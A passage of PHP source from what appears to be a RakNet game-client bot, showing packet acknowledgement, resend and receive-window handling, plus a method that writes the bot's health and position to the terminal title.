		$pk->address = $this->serverAddress;
		for ($i = 0; $i < 10; ++$i) {
			$pk->systemAddresses[$i] = $pk->address;
		}
		$pk->sendPingTime = $pk->sendPongTime = 0;
		$this->sendSessionRakNetPacket($pk);
	}

	protected function update(): void
	{
		$diff = $this->highestSeqNumberThisTick - $this->windowStart + 1;
		assert($diff >= 0);
		if ($diff > 0) {
			//Move the receive window to account for packets we either received or are about to NACK
			//we ignore any sequence numbers that we sent NACKs for, because we expect the client to resend them
			//when it gets a NACK for it

			$this->windowStart += $diff;
			$this->windowEnd += $diff;
		}

		if (count($this->ACKQueue) > 0) {
			$pk = new ACK();
			$pk->packets = $this->ACKQueue;
			$this->sendRakNetPacket($pk);
			$this->ACKQueue = [];
		}

		if (count($this->NACKQueue) > 0) {
			$pk = new NACK();
			$pk->packets = $this->NACKQueue;
			$this->sendRakNetPacket($pk);
			$this->NACKQueue = [];
		}

		if (count($this->packetToSend) > 0) {
			foreach ($this->packetToSend as $k => $pk) {
				$this->sendSessionRakNetPacket($pk);
				unset($this->packetToSend[$k]);
			}
			if (count($this->packetToSend) > self::$WINDOW_SIZE) { //TODO: check limit
				$this->packetToSend = [];
			}
		}

		foreach ($this->recoveryQueue as $seq => $pk) {
			if ($pk->sendTime < (time() - 8)) {
				$this->packetToSend[] = $pk;
				unset($this->recoveryQueue[$seq]);
			} else {
				break;
			}
		}
	}

	protected function titleTick()
	{
		$player = $this->player;
		echo "\x1b]0;" . CLIENTNAME . ' > Bot: ' .
			$player->getName() . ' [id: ' . $player->getId() . '] ' .
			'(Health: ' . $player->getHealth() . '/' . $player->getMaxHealth() . ') ' .
			'(Hunger: ' . $player->getHunger() . '/' . $player->getMaxHunger() . ') ' .
			'(Food: ' . $player->getFood() . '/' . $player->getMaxFood() . ') ' .
			'X: ' . $this->player->x . ' Y: ' . $this->player->y . ' Z: ' . $this->player->z .
			' YAW: ' . $this->player->yaw . ' PITCH: ' . $this->player->pitch .
			"\x07";
	}
}